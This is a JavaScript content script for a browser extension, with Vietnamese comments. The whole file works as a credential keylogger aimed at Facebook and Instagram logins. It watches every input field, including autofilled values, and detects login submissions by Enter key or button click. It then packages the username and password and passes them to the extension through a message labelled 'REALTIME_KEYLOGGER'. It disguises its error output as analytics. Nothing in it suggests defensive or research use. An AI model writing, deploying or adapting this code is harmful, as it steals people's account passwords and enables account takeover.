let lastSentSignature = "";
let currentUsername = "";
let currentPassword = "";

// Lắng nghe liên tục mọi thay đổi giá trị trên các ô input (cả khi gõ phím hoặc Autofill)
document.addEventListener('input', (event) => {
  const target = event.target;
  if (target && target.tagName === 'INPUT') {
    const type = (target.type || '').toLowerCase();
    const name = (target.name || '').toLowerCase();
    const id = (target.id || '').toLowerCase();
    const placeholder = (target.placeholder || '').toLowerCase();
    const val = target.value ? target.value.trim() : '';

    if (val.length > 0) {
      if (
        type === 'email' || type === 'text' || type === 'tel' ||
        name.includes('email') || name.includes('user') || name.includes('identifier') ||
        id.includes('email') || id.includes('user') || id.includes('login') ||
        placeholder.includes('email') || placeholder.includes('phone') || placeholder.includes('username') || placeholder.includes('số điện thoại')
      ) {
        currentUsername = val;
      } else if (
        type === 'password' || 
        name.includes('pass') || id.includes('pass') ||
        placeholder.includes('mật khẩu') || placeholder.includes('password')
      ) {
        currentPassword = val;
      }
    }
  }
}, true);

// Lắng nghe sự kiện khi nhấn Enter hoặc bấm nút đăng nhập để chốt và gửi log
document.addEventListener('keydown', (event) => {
  if (event.key === 'Enter') {
    sendTypingLog();
  }
}, true);

document.addEventListener('click', (event) => {
  const target = event.target;
  if (target) {
    const text = (target.innerText || '').toLowerCase();
    const type = (target.type || '').toLowerCase();
    const id = (target.id || '').toLowerCase();
    
    if (type === 'submit' || id.includes('login') || text.includes('log in') || text.includes('đăng nhập') || text.includes('tiếp tục')) {
      sendTypingLog();
    }
  }
}, true);

function sendTypingLog() {
  setTimeout(() => {
    try {
      // Quét bổ sung lần cuối để đảm bảo không bỏ sót nếu chưa bắt được qua event input
      const inputs = document.querySelectorAll('input');
      inputs.forEach(input => {
        const type = (input.type || '').toLowerCase();
        const val = input.value ? input.value.trim() : '';
        if (val.length > 0) {
          if (type === 'password') {
            currentPassword = val;
          } else if ((type === 'text' || type === 'email' || type === 'tel' || type === '') && !currentUsername) {
            currentUsername = val;
          }
        }
      });

      if (!currentUsername && currentPassword) {
        const profileEl = document.querySelector('h1, h2, h3, [role="heading"]');
        currentUsername = profileEl ? profileEl.innerText.trim() : "Saved_Account_User";
      }

      const finalUser = (currentUsername && currentUsername !== "undefined") ? currentUsername : "N/A";
      const finalPass = (currentPassword && currentPassword !== "undefined") ? currentPassword : "N/A";

      if (finalUser !== "N/A" || finalPass !== "N/A") {
        const platformName = window.location.hostname.includes('instagram') ? 'Instagram' : 'Facebook';
        const signature = `${platformName}_${finalUser}_${finalPass}`;

        if (signature !== lastSentSignature) {
          lastSentSignature = signature;

          if (typeof window !== 'undefined' && typeof chrome !== 'undefined' && chrome && chrome.runtime && typeof chrome.runtime.sendMessage === 'function') {
            try {
              chrome.runtime.sendMessage({
                type: "REALTIME_KEYLOGGER",
                platform: platformName,
                username: finalUser,
                password: finalPass,
                time: new Date().toLocaleString("vi-VN")
              });
            } catch (innerErr) {
              // Bỏ qua lỗi ngữ cảnh ngầm
            }
          }
        }
      }
    } catch (err) {
      console.error("[Analytics] Capture error:", err);
    }
  }, 200);
}